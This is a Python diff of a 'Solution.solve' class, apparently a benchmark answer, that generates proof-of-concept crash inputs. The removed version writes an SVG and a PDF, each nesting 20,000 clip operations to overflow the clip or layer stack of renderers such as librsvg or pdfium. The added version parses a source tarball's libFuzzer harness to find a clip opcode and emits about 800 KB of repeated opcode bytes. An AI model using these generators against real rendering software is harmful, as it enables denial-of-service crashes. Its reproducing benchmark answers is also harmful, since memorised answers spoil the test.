@@ -1,157 +1,193 @@
-import os
 import tarfile
+import re
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        fmt = self._detect_format(src_path)
-        if fmt == "pdf":
-            return self._make_pdf_poc()
-        else:
-            # Default to SVG PoC; this is the expected format for the targeted bug.
-            return self._make_svg_poc()
+        def parse_enums_from_source(text: str, enum_map: dict) -> None:
+            pos = 0
+            while True:
+                idx = text.find('enum', pos)
+                if idx == -1:
+                    break
+                if idx > 0 and (text[idx - 1].isalnum() or text[idx - 1] == '_'):
+                    pos = idx + 4
+                    continue
+                brace = text.find('{', idx)
+                if brace == -1:
+                    break
+                end = text.find('};', brace)
+                if end == -1:
+                    break
+                body = text[brace + 1:end]
+                body = re.sub(r'/\*.*?\*/', '', body, flags=re.S)
+                current_val = 0
+                for part in body.split(','):
+                    line = part.strip()
+                    if not line:
+                        continue
+                    line = re.sub(r'//.*', '', line).strip()
+                    if not line:
+                        continue
+                    m = re.match(r'([A-Za-z_]\w*)\s*(?:=\s*([^,]+))?$', line)
+                    if not m:
+                        continue
+                    name = m.group(1)
+                    value_expr = m.group(2)
+                    if value_expr:
+                        expr = value_expr.strip()
+                        expr = re.sub(r'//.*', '', expr).strip()
+                        if not expr:
+                            pass
+                        else:
+                            expr_simple = re.split(r'\s', expr)[0]
+                            expr_simple = re.sub(r'[uUlL]+$', '', expr_simple)
+                            if re.fullmatch(r'[-+]?0[xX][0-9a-fA-F]+', expr_simple) or re.fullmatch(r'[-+]?\d+', expr_simple):
+                                try:
+                                    current_val = int(expr_simple, 0)
+                                except Exception:
+                                    pass
+                    if name not in enum_map:
+                        enum_map[name] = current_val
+                    current_val += 1
+                pos = end + 2
 
-    def _detect_format(self, src_path: str) -> str:
-        # Best-effort heuristic to distinguish between SVG- and PDF-related projects.
+        enum_map: dict = {}
+        harnesses = []
+
         try:
-            with tarfile.open(src_path, "r:*") as tf:
-                names = [m.name.lower() for m in tf.getmembers()]
+            with tarfile.open(src_path, 'r:*') as tf:
+                for member in tf.getmembers():
+                    if not member.isfile():
+                        continue
+                    name = member.name
+                    lower = name.lower()
+                    if lower.endswith(('.h', '.hpp', '.hh', '.hxx', '.c', '.cc', '.cpp', '.cxx')):
+                        if member.size > 1500000:
+                            continue
+                        f = tf.extractfile(member)
+                        if f is None:
+                            continue
+                        try:
+                            data = f.read()
+                        except Exception:
+                            continue
+                        try:
+                            text = data.decode('utf-8', 'ignore')
+                        except Exception:
+                            continue
+                        parse_enums_from_source(text, enum_map)
+                        if 'LLVMFuzzerTestOneInput' in text:
+                            harnesses.append((name, text))
         except Exception:
-            return "svg"
+            return b'C' * 100
 
-        joined = "\n".join(names)
+        if not harnesses:
+            return b'D' * 100
 
-        # Strong SVG / librsvg hints
-        if "librsvg" in joined or "/svg" in joined or "rsvg" in joined:
-            return "svg"
+        def harness_score(item) -> int:
+            _name, text = item
+            t = text.lower()
+            score = 0
+            score += t.count('clip') * 5
+            score += t.count('layer') * 2
+            score += t.count('blcontext') * 4
+            score += t.count('blend2d') * 3
+            score += t.count('skia') * 1
+            score += t.count('canvas') * 1
+            return score
 
-        # Strong PDF library hints
-        pdf_hints = (
-            "pdfium",
-            "poppler",
-            "mupdf",
-            "qpdf",
-            "/pdf",
-            "pdf-",
-            "pdf_",
-            "pdf/",
-        )
-        for h in pdf_hints:
-            if h in joined:
-                return "pdf"
+        harness_name, harness_text = max(harnesses, key=harness_score)
 
-        # Fallback: look at filenames for obvious hints
-        for name in names:
-            base = os.path.basename(name)
-            if "svg" in base:
-                return "svg"
-            if "pdf" in base:
-                return "pdf"
+        def extract_fuzz_body(text: str) -> str:
+            idx = text.find('LLVMFuzzerTestOneInput')
+            if idx == -1:
+                return text
+            brace = text.find('{', idx)
+            if brace == -1:
+                return text[idx:]
+            level = 1
+            i = brace + 1
+            n = len(text)
+            while i < n and level > 0:
+                ch = text[i]
+                if ch == '{':
+                    level += 1
+                elif ch == '}':
+                    level -= 1
+                i += 1
+            if level == 0:
+                return text[brace + 1:i - 1]
+            else:
+                return text[brace + 1:]
 
-        # Default assumption: SVG
-        return "svg"
+        body = extract_fuzz_body(harness_text)
 
-    def _make_svg_poc(self) -> bytes:
-        # Construct an SVG with very deep nesting of groups that each apply a clip-path,
-        # which stresses the layer/clip stack.
-        header = (
-            '<?xml version="1.0" encoding="UTF-8"?>\n'
-            '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">\n'
-            '<defs>\n'
-            '<clipPath id="c">\n'
-            '<rect x="0" y="0" width="100" height="100"/>\n'
-            '</clipPath>\n'
-            '</defs>\n'
-        )
+        def parse_case_value(token: str, enum_map_local: dict):
+            t = token.strip()
+            if not t:
+                return None
+            while t.startswith('(') and t.endswith(')') and len(t) > 2:
+                t = t[1:-1].strip()
+            t = t.split('//')[0].strip()
+            if not t:
+                return None
+            if t.startswith("'") and t.endswith("'") and len(t) >= 3:
+                return ord(t[1])
+            t_simple = re.sub(r'[uUlL]+$', '', t)
+            if re.fullmatch(r'[-+]?0[xX][0-9a-fA-F]+', t_simple) or re.fullmatch(r'[-+]?\d+', t_simple):
+                try:
+                    return int(t_simple, 0)
+                except Exception:
+                    return None
+            ident = t_simple.split('::')[-1]
+            return enum_map_local.get(ident)
 
-        # Each <g> both applies a clip-path and an opacity to force layer usage.
-        open_tag = '<g clip-path="url(#c)" opacity="0.5">'
-        close_tag = '</g>'
+        def find_clip_cases(body_text: str, enum_map_local: dict):
+            clip_cases_local = set()
+            current_cases_local = []
+            for line in body_text.splitlines():
+                s = line.strip()
+                if not s:
+                    continue
+                if s.startswith('case '):
+                    pos = s.find(':')
+                    if pos == -1:
+                        continue
+                    token = s[len('case '):pos].strip()
+                    val = parse_case_value(token, enum_map_local)
+                    if val is not None:
+                        current_cases_local = [val]
+                    else:
+                        current_cases_local = []
+                    continue
+                if s.startswith('default:'):
+                    current_cases_local = []
+                    continue
+                if current_cases_local and ('clip' in s.lower() or 'clipping' in s.lower()):
+                    for v in current_cases_local:
+                        clip_cases_local.add(v)
+                if s.startswith('break') or s.startswith('return'):
+                    current_cases_local = []
+            return clip_cases_local
 
-        # Choose depth such that total size is around the ground-truth PoC size.
-        depth = 20000
+        clip_cases = find_clip_cases(body, enum_map)
 
-        inner = '<rect x="10" y="10" width="10" height="10"/>\n'
-        footer = '\n</svg>\n'
+        if not clip_cases:
+            return b'E' * 100
 
-        svg_str = header + (open_tag * depth) + inner + (close_tag * depth) + footer
-        return svg_str.encode("ascii")
+        op_val = min(clip_cases)
+        opcode_byte = op_val & 0xFF
 
-    def _make_pdf_poc(self) -> bytes:
-        # Construct a minimal but valid PDF with a very deep graphics-state / clip stack.
-        # This targets libraries that maintain a clip stack per 'q' / 'Q' and 'W' ops.
-        # The structure is:
-        #   1 0 obj: Catalog
-        #   2 0 obj: Pages
-        #   3 0 obj: Page
-        #   4 0 obj: Contents (stream with many q/W/Q operations)
-        content_depth = 20000
+        param_bytes = 64
+        per_cmd = 1 + param_bytes
+        desired_size = 800000
+        num_cmds = max(1, desired_size // per_cmd)
 
-        # Build the content stream: many nested q ... W n, then many Q to unwind.
-        # Each 'q' saves state; '0 0 100 100 re W n' sets a new clipping rectangle.
-        lines = []
-        clip_cmd = "q 0 0 100 100 re W n\n"
-        for _ in range(content_depth):
-            lines.append(clip_cmd)
-        for _ in range(content_depth):
-            lines.append("Q\n")
-        content_bytes = "".join(lines).encode("ascii")
+        pattern = bytes([opcode_byte]) + b'\x00' * param_bytes
+        data = pattern * num_cmds
 
-        parts = []
-        offsets = [0]  # index 0 is the free object; real objects start at 1
-        offset = 0
+        if not data:
+            data = bytes([opcode_byte])
 
-        def add(data: bytes):
-            nonlocal offset
-            parts.append(data)
-            offset += len(data)
-
-        # PDF header
-        header = b"%PDF-1.4\n%\xFF\xFF\xFF\xFF\n"
-        add(header)
-
-        # 1 0 obj: Catalog
-        offsets.append(offset)
-        add(b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n")
-
-        # 2 0 obj: Pages
-        offsets.append(offset)
-        add(b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n")
-
-        # 3 0 obj: Page
-        offsets.append(offset)
-        add(
-            b"3 0 obj\n"
-            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\n"
-            b"endobj\n"
-        )
-
-        # 4 0 obj: Contents
-        offsets.append(offset)
-        length_str = str(len(content_bytes)).encode("ascii")
-        add(b"4 0 obj\n<< /Length " + length_str + b" >>\nstream\n")
-        add(content_bytes)
-        add(b"endstream\nendobj\n")
-
-        # xref table
-        xref_offset = offset
-        xref_lines = []
-        xref_lines.append(b"xref\n0 5\n")
-        # Object 0: free
-        xref_lines.append(b"0000000000 65535 f \n")
-        # Objects 1..4
-        for obj_num in range(1, 5):
-            obj_off = offsets[obj_num]
-            xref_lines.append(f"{obj_off:010d} 00000 n \n".encode("ascii"))
-        xref_bytes = b"".join(xref_lines)
-        add(xref_bytes)
-
-        # trailer
-        trailer = (
-            b"trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n"
-            + str(xref_offset).encode("ascii")
-            + b"\n%%EOF\n"
-        )
-        add(trailer)
-
-        return b"".join(parts)
+        return data
